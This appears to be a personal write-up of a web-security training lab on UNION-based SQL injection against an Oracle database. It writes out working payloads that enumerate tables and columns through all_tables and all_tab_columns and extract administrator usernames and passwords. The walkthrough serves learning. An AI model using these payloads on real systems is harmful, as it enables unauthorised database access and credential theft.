![](../../attachments/Pasted%20image%2020240528164508.png)

From the LAB description there is a SQL Vulnerability in the product category filter and to complete this lab we need to log in as administrator 

this lab contains oracle database 
refer to [SQL CHEAT SHEET](../SQL%20CHEAT%20SHEET.md) for payloads

HINT:
On Oracle databases, every `SELECT` statement must specify a table to select `FROM`. If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.

There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual`

let's know about dual 
https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/Selecting-from-the-DUAL-Table.html


i've captured the request and sent into the repeater 

This website has 2 columns too since we got internal server with order by 3

let's check for data type to perform union attack 
![](../../attachments/Pasted%20image%2020240528165117.png)

we now know that both are of same text we can inject our paylaoads

From the cheat sheet since it's a oracle database

 `'+UNION+SELECT+table_name,NULL+FROM+all_tables--`
will list all the 

![](../../attachments/Pasted%20image%2020240528165310.png)

we've got some table listed let's go through tables and find what we r looking for

![](../../attachments/Pasted%20image%2020240528165534.png)

we've got our username table now let's view that table
username table : USERS_QFTLRV

to view the details of username table 

'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_QFTLRV'--

![](../../attachments/Pasted%20image%2020240528165801.png)

password table : PASSWORD_KSZHEB
username : USERNAME_PNBHKP
now  let's retrieve the details 

payload will be 

'+UNION+SELECT+USERNAME_PNBHKP,+PASSWORD_KSZHEB+FROM+USERS_QFTLRV--

![](../../attachments/Pasted%20image%2020240528170016.png)

we got the administrator details let's login to our account to solve the lab 

![](../../attachments/Pasted%20image%2020240528170228.png)